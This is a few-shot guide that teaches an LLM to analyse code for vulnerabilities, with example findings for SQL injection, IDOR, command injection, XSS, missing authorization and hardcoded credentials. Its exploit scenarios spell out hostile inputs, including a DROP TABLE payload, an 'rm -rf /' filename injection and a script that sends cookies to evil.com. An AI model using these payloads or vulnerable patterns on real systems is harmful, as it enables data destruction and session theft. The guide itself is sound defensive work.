# Security Analysis Examples

This document provides few-shot examples for the LLM to learn how to analyze code for security vulnerabilities. Each example shows the input code, analysis process, and expected finding output.

---

## Example 1: SQL Injection (HIGH - Tampering)

### Input Code (Python)

```python
# File: src/api/users.py, lines 45-52

def search_users(request):
    query = request.GET.get('q', '')
    sql = f"SELECT * FROM users WHERE name LIKE '%{query}%'"
    cursor = connection.cursor()
    cursor.execute(sql)
    return cursor.fetchall()
```

### Analysis Process

1. **Identify input source**: `query` comes from `request.GET.get('q')` - user-controlled HTTP parameter
2. **Trace data flow**: `query` → f-string interpolation → `sql` → `cursor.execute()`
3. **Check for sanitization**: No validation, escaping, or parameterization
4. **Check for mitigations**: No ORM, no prepared statement, no input validation middleware
5. **Determine exploitability**: Direct SQL execution with user input = easily exploitable
6. **Reference threat model**: Section 5.2 - SQL Injection under Tampering

### Generated Finding

```json
{
  "id": "VULN-001",
  "severity": "HIGH",
  "stride_category": "Tampering",
  "vulnerability_type": "SQL Injection",
  "cwe": "CWE-89",
  "file": "src/api/users.py",
  "line_range": "45-52",
  "code_context": "sql = f\"SELECT * FROM users WHERE name LIKE '%{query}%'\"\ncursor.execute(sql)",
  "analysis": "User input from request.GET is directly interpolated into SQL query using f-string without any sanitization or parameterization. The query parameter is passed directly to cursor.execute().",
  "exploit_scenario": "Attacker submits q=test%' OR '1'='1 to bypass the LIKE filter and retrieve all users. More severe: q=test'; DROP TABLE users; -- to delete the users table.",
  "threat_model_reference": "Section 5.2 - SQL Injection (Tampering)",
  "existing_mitigations": [],
  "recommended_fix": "Use parameterized queries: cursor.execute(\"SELECT * FROM users WHERE name LIKE ?\", (f'%{query}%',)) or use Django ORM: User.objects.filter(name__icontains=query)",
  "confidence": "HIGH",
  "reasoning": "Direct string interpolation in SQL query with user-controlled input and no validation. Classic SQL injection pattern."
}
```

---

## Example 2: IDOR - Insecure Direct Object Reference (HIGH - InfoDisclosure)

### Input Code (JavaScript/Express)

```javascript
// File: src/routes/documents.js, lines 23-30

router.get('/api/documents/:id', async (req, res) => {
  const documentId = req.params.id;
  const document = await Document.findById(documentId);

  if (!document) {
    return res.status(404).json({ error: 'Document not found' });
  }

  res.json(document);
});
```

### Analysis Process

1. **Identify input source**: `documentId` comes from URL parameter `:id` - user-controlled
2. **Trace data flow**: `req.params.id` → `documentId` → `Document.findById()`
3. **Check for authorization**: No check that current user owns or has access to this document
4. **Check for mitigations**: No middleware visible, no ownership verification in query
5. **Determine exploitability**: Any authenticated user can access any document by ID
6. **Reference threat model**: Section 5.4 - IDOR under Information Disclosure

### Generated Finding

```json
{
  "id": "VULN-002",
  "severity": "HIGH",
  "stride_category": "InfoDisclosure",
  "vulnerability_type": "Insecure Direct Object Reference (IDOR)",
  "cwe": "CWE-639",
  "file": "src/routes/documents.js",
  "line_range": "23-30",
  "code_context": "const document = await Document.findById(documentId);\nres.json(document);",
  "analysis": "The endpoint retrieves a document by ID from the URL parameter without verifying that the authenticated user has permission to access it. Any user can access any document by guessing or enumerating document IDs.",
  "exploit_scenario": "User A creates a private document with ID 'abc123'. User B (or unauthenticated attacker) accesses GET /api/documents/abc123 and retrieves User A's private document.",
  "threat_model_reference": "Section 5.4 - IDOR (Information Disclosure)",
  "existing_mitigations": [],
  "recommended_fix": "Add ownership check: const document = await Document.findOne({ _id: documentId, userId: req.user.id }); or implement RBAC middleware that verifies access permissions.",
  "confidence": "HIGH",
  "reasoning": "No authorization check between fetching document and returning it. Direct object reference without ownership verification."
}
```

---

## Example 3: Command Injection (CRITICAL - Tampering)

### Input Code (Python)

```python
# File: src/utils/image_processor.py, lines 15-20

def resize_image(filename, width, height):
    output_file = f"resized_{filename}"
    command = f"convert {filename} -resize {width}x{height} {output_file}"
    os.system(command)
    return output_file
```

### Analysis Process

1. **Identify input source**: `filename`, `width`, `height` - potentially user-controlled
2. **Trace data flow**: Parameters → f-string → `command` → `os.system()`
3. **Check for sanitization**: No validation of filename or dimensions
4. **Check for mitigations**: Using `os.system()` with shell=True semantics
5. **Determine exploitability**: Shell metacharacters in filename = RCE
6. **Reference threat model**: Section 5.2 - Command Injection under Tampering

### Generated Finding

```json
{
  "id": "VULN-003",
  "severity": "CRITICAL",
  "stride_category": "Tampering",
  "vulnerability_type": "Command Injection",
  "cwe": "CWE-78",
  "file": "src/utils/image_processor.py",
  "line_range": "15-20",
  "code_context": "command = f\"convert {filename} -resize {width}x{height} {output_file}\"\nos.system(command)",
  "analysis": "User-controlled filename is directly interpolated into a shell command executed via os.system(). Shell metacharacters in the filename parameter can execute arbitrary commands on the server.",
  "exploit_scenario": "Attacker uploads file named 'image.jpg; rm -rf / #' or 'image.jpg$(whoami)'. The shell interprets the semicolon/backticks and executes the injected command with server privileges.",
  "threat_model_reference": "Section 5.2 - Command Injection (Tampering)",
  "existing_mitigations": [],
  "recommended_fix": "Use subprocess with list arguments (no shell): subprocess.run(['convert', filename, '-resize', f'{width}x{height}', output_file], check=True). Also validate filename contains only allowed characters.",
  "confidence": "HIGH",
  "reasoning": "os.system() with string interpolation is a textbook command injection pattern. No input validation visible."
}
```

---

## Example 4: Missing Authorization Check (HIGH - ElevationOfPrivilege)

### Input Code (TypeScript/Express)

```typescript
// File: src/routes/admin.ts, lines 45-55

router.delete('/api/admin/users/:userId', async (req, res) => {
  const { userId } = req.params;

  await User.findByIdAndDelete(userId);

  res.json({ success: true, message: 'User deleted' });
});
```

### Analysis Process

1. **Identify endpoint purpose**: Admin endpoint to delete users
2. **Check for authentication**: No `requireAuth` middleware visible
3. **Check for authorization**: No admin role check, no permission verification
4. **Check for mitigations**: Route path suggests admin-only, but no enforcement
5. **Determine exploitability**: Any user (or unauthenticated) can delete any user
6. **Reference threat model**: Section 5.6 - Missing Authorization under Elevation of Privilege

### Generated Finding

```json
{
  "id": "VULN-004",
  "severity": "HIGH",
  "stride_category": "ElevationOfPrivilege",
  "vulnerability_type": "Missing Authorization",
  "cwe": "CWE-862",
  "file": "src/routes/admin.ts",
  "line_range": "45-55",
  "code_context": "router.delete('/api/admin/users/:userId', async (req, res) => {\n  await User.findByIdAndDelete(userId);\n});",
  "analysis": "Admin endpoint for deleting users has no authentication or authorization middleware. The '/admin/' path prefix suggests privileged access, but no enforcement is implemented. Any user can delete any other user.",
  "exploit_scenario": "Unauthenticated attacker sends DELETE /api/admin/users/target-user-id to delete arbitrary user accounts, including admin accounts.",
  "threat_model_reference": "Section 5.6 - Missing Authorization (Elevation of Privilege)",
  "existing_mitigations": [],
  "recommended_fix": "Add authentication and admin authorization middleware: router.delete('/api/admin/users/:userId', requireAuth, requireAdmin, async (req, res) => { ... })",
  "confidence": "HIGH",
  "reasoning": "Admin endpoint with destructive action has no visible auth middleware. Path naming convention not enforced by code."
}
```

---

## Example 5: XSS - Cross-Site Scripting (HIGH - Tampering)

### Input Code (React/JSX)

```jsx
// File: src/components/UserProfile.jsx, lines 12-20

function UserProfile({ user }) {
  return (
    <div className="profile">
      <h2>{user.name}</h2>
      <div className="bio" dangerouslySetInnerHTML={{ __html: user.bio }} />
    </div>
  );
}
```

### Analysis Process

1. **Identify input source**: `user.bio` - user-provided content from database
2. **Trace data flow**: User input → database → `user.bio` → `dangerouslySetInnerHTML`
3. **Check for sanitization**: No sanitization before rendering
4. **Check for mitigations**: Using `dangerouslySetInnerHTML` bypasses React's XSS protection
5. **Determine exploitability**: Stored XSS - attacker stores malicious script in bio
6. **Reference threat model**: Section 5.2 - XSS under Tampering

### Generated Finding

```json
{
  "id": "VULN-005",
  "severity": "HIGH",
  "stride_category": "Tampering",
  "vulnerability_type": "Cross-Site Scripting (XSS) - Stored",
  "cwe": "CWE-79",
  "file": "src/components/UserProfile.jsx",
  "line_range": "12-20",
  "code_context": "dangerouslySetInnerHTML={{ __html: user.bio }}",
  "analysis": "User-provided bio content is rendered using dangerouslySetInnerHTML without sanitization. This bypasses React's built-in XSS protection and allows stored XSS attacks.",
  "exploit_scenario": "Attacker sets their bio to '<script>document.location=\"https://evil.com/steal?cookie=\"+document.cookie</script>'. When other users view the profile, the script executes and steals their session cookies.",
  "threat_model_reference": "Section 5.2 - XSS (Tampering)",
  "existing_mitigations": [],
  "recommended_fix": "Either: 1) Remove dangerouslySetInnerHTML and use {user.bio} for auto-escaping, or 2) Sanitize with DOMPurify: dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(user.bio) }}",
  "confidence": "HIGH",
  "reasoning": "dangerouslySetInnerHTML with user content is explicit XSS vulnerability. No sanitization library visible."
}
```

---

## Example 6: Hardcoded Credentials (MEDIUM - InfoDisclosure)

### Input Code (Python)

```python
# File: src/config/database.py, lines 5-12

DATABASE_CONFIG = {
    'host': 'db.example.com',
    'port': 5432,
    'database': 'production',
    'user': 'admin',
    'password': 'SuperSecret123!'
}
```

### Analysis Process

1. **Identify the issue**: Password hardcoded in source code
2. **Assess exposure**: Source code in version control = password exposed
3. **Check for mitigations**: Not using environment variables or secrets manager
4. **Determine impact**: Database credentials exposed, potential data breach
5. **Reference threat model**: Section 5.4 - Hardcoded Secrets under Information Disclosure

### Generated Finding

```json
{
  "id": "VULN-006",
  "severity": "MEDIUM",
  "stride_category": "InfoDisclosure",
  "vulnerability_type": "Hardcoded Credentials",
  "cwe": "CWE-798",
  "file": "src/config/database.py",
  "line_range": "5-12",
  "code_context": "'password': 'SuperSecret123!'",
  "analysis": "Database password is hardcoded in source code. This exposes credentials to anyone with repository access and persists in version control history even if later removed.",
  "exploit_scenario": "Attacker gains access to repository (insider, leaked repo, compromised developer machine) and obtains production database credentials. Can directly access and exfiltrate database contents.",
  "threat_model_reference": "Section 5.4 - Hardcoded Secrets (Information Disclosure)",
  "existing_mitigations": [],
  "recommended_fix": "Use environment variables: password=os.environ.get('DB_PASSWORD'). Store secrets in a secrets manager (AWS Secrets Manager, HashiCorp Vault) or .env file excluded from git.",
  "confidence": "HIGH",
  "reasoning": "Literal password string in configuration file. Clear secret exposure."
}
```

---

## Example 7: False Positive - Safe Parameterized Query

### Input Code (Python)

```python
# File: src/api/products.py, lines 30-38

def get_products_by_category(category_id):
    query = "SELECT * FROM products WHERE category_id = %s AND active = TRUE"
    cursor = connection.cursor()
    cursor.execute(query, (category_id,))
    return cursor.fetchall()
```

### Analysis Process

1. **Identify pattern**: SQL query with variable
2. **Check query construction**: Query string uses `%s` placeholder, not f-string
3. **Check execution**: `cursor.execute(query, (category_id,))` - parameterized!
4. **Verify safety**: Parameter passed as tuple, database driver handles escaping
5. **Conclusion**: This is the SAFE pattern, not vulnerable

### Result: NO FINDING

This code uses parameterized queries correctly. The `%s` is a placeholder that the database driver safely substitutes, not Python string formatting. This is the recommended fix pattern for SQL injection, not a vulnerability.

**Do not generate a finding for this code.**

---

## Example 8: False Positive - Authorization in Middleware

### Input Code (TypeScript)

```typescript
// File: src/routes/documents.ts, lines 15-25

// Note: requireOwnership middleware defined in src/middleware/auth.ts
router.get(
  '/api/documents/:id',
  requireAuth,
  requireOwnership('document'),
  async (req, res) => {
    const document = await Document.findById(req.params.id);
    res.json(document);
  }
);
```

### Analysis Process

1. **Identify pattern**: Direct object access by ID
2. **Check for authorization**: Two middleware functions applied
3. **Analyze middleware**: `requireAuth` checks authentication, `requireOwnership` checks ownership
4. **Verify protection**: Authorization is handled before handler executes
5. **Conclusion**: Protected by middleware, not vulnerable to IDOR

### Result: NO FINDING

While the handler itself doesn't check ownership, the `requireOwnership('document')` middleware handles this. The authorization check exists, just in a different layer. This is a common and valid pattern.

**Do not generate a finding for this code.**

---

## Summary: Key Indicators

### Vulnerable Patterns to Flag

| Pattern                                              | Vulnerability       | Confidence |
| ---------------------------------------------------- | ------------------- | ---------- |
| f-string/template in SQL + execute()                 | SQL Injection       | HIGH       |
| String concat in SQL                                 | SQL Injection       | HIGH       |
| os.system(), subprocess with shell=True + user input | Command Injection   | HIGH       |
| dangerouslySetInnerHTML without sanitizer            | XSS                 | HIGH       |
| innerHTML = userInput                                | XSS                 | HIGH       |
| findById(req.params.id) without ownership check      | IDOR                | HIGH       |
| No auth middleware on sensitive endpoint             | Missing Auth        | HIGH       |
| Hardcoded password/key strings                       | Credential Exposure | HIGH       |

### Safe Patterns to Ignore

| Pattern                                         | Why Safe                 |
| ----------------------------------------------- | ------------------------ |
| cursor.execute(query, (params,))                | Parameterized query      |
| ORM methods (User.objects.filter())             | ORM handles escaping     |
| {variable} in JSX (not dangerouslySetInnerHTML) | React auto-escapes       |
| subprocess.run([cmd, arg1, arg2]) without shell | No shell interpretation  |
| Auth middleware on route                        | Authorization handled    |
| os.environ.get('SECRET')                        | Secrets from environment |

### Context Matters

Always consider:

1. Is there validation/sanitization earlier in the request pipeline?
2. Is there middleware that handles auth/authz?
3. Does the framework provide automatic protection?
4. Is the input actually user-controlled, or is it from a trusted source?
